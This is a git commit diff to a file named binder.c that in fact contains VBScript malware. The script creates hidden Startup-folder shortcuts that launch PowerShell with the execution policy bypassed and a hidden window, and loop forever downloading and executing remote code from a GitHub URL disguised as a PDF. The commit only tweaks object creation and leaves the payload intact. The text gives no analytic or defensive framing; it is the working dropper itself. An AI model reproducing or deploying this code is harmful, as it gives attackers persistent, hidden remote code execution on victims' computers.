5ae928d0519421226ed06f8f2f90bc0c7c6a98a0
d13dc0d3 <36966092+d13dc0d3@users.noreply.github.com>
2018-03-04 10:41:01 -0800

    Update binder.c

--- binder.c
+++ binder.c
@@ -14,7 +14,7 @@
 	<script language="VBScript">
 		<![CDATA[
 		
-set WshShell = WScript.CreateObject("WScript.Shell")
+set WshShell = CreateObject("WScript.Shell")
 strDesktop = WshShell.SpecialFolders("Programs")
 set oShellLink = WshShell.CreateShortcut(strDesktop & "\Startup\amel.lnk")
 oShellLink.TargetPath = "cmd.exe"
@@ -22,7 +22,7 @@ oShellLink.WindowStyle = 7
 oShellLink.Arguments = "/c powershell -ExecutionPolicy b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/riyantigomez/gomez22/master/n4.pdf'))}catch{}Start-Sleep 30}"
 oShellLink.Save
 
-set WshShell = WScript.CreateObject("WScript.Shell")
+set WshShell = CreateObject("WScript.Shell")
 strDesktop = WshShell.SpecialFolders("Programs")
 set oShellLink = WshShell.CreateShortcut(strDesktop & "\Startup\amel2.lnk")
 oShellLink.TargetPath = "cmd.exe"
